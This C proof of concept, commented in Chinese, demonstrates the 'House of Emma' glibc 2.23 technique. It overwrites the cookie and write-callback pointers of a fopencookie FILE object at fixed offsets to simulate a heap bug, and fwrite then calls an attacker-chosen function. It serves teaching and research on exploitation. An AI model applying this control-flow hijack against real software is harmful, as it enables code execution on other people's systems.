#define _GNU_SOURCE
/*
 * 手法：借 `_IO_cookie_jumps` 通往一个用户可控回调的 House of Emma，适用于 glibc 2.23，x86-64。
 *
 * 2.23 的 `_IO_cookie_file.__io_functions` 里保存的仍是明文函数指针。这里先用
 * `fopencookie` 创建一个带合法 `_IO_cookie_jumps` 的真实对象，再模拟一次堆
 * overflow/UAF，覆盖 `__cookie` 和 write callback。`fwrite` 最终会经过合法的
 * primary vtable 调用到攻击者的函数。
 *
 * 2.24 的 983fd5c 开始给四个 callback 都加上了 PTR_MANGLE；不要把本文件的做法
 * 套用到 2.24 之后的版本，那种情况要用另一份能从已知 callback 反推出
 * pointer_guard 的 PoC。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

static void *expected_cookie;
static int callback_count;

static ssize_t benign_write(void *cookie, const char *buffer, size_t size)
{
    (void)cookie;
    (void)buffer;
    return (ssize_t)size;
}

static ssize_t emma_callback(void *cookie, const char *buffer, size_t size)
{
    callback_count++;
    assert(cookie == expected_cookie);
    assert(size == 4);
    assert(memcmp(buffer, "EMMA", 4) == 0);
    puts("[+] Emma 2.23：明文回调命中");
    return (ssize_t)size;
}

int main(void)
{
    setbuf(stdout, NULL);
    assert(sizeof(FILE) == 0xd8);

    cookie_io_functions_t functions;
    memset(&functions, 0, sizeof(functions));
    functions.write = benign_write;

    uint64_t original_cookie = 0x1111111111111111ULL;
    uint64_t controlled_cookie = 0x454d4d415f323233ULL;
    FILE *fp = fopencookie(&original_cookie, "w", functions);
    assert(fp != NULL);
    assert(setvbuf(fp, NULL, _IONBF, 0) == 0);

    /* x86-64 上的 `_IO_cookie_file`：FILE +0xd8 是 vtable，紧接着 +0xe0 是 cookie，
       read/write/seek/close 四个回调依次排在 +0xe8/+0xf0/+0xf8/+0x100。 */
    void **cookie_slot = (void **)((char *)fp + 0xe0);
    uintptr_t *write_slot = (uintptr_t *)((char *)fp + 0xf0);
    assert(*write_slot == (uintptr_t)benign_write); /* 2.23 上这里必须是明文指针。 */

    expected_cookie = &controlled_cookie;
    *cookie_slot = expected_cookie;
    *write_slot = (uintptr_t)emma_callback;         /* 这一步是漏洞模拟。 */

    assert(fwrite("EMMA", 1, 4, fp) == 4);
    assert(callback_count == 1);
    fclose(fp);
    return 0;
}
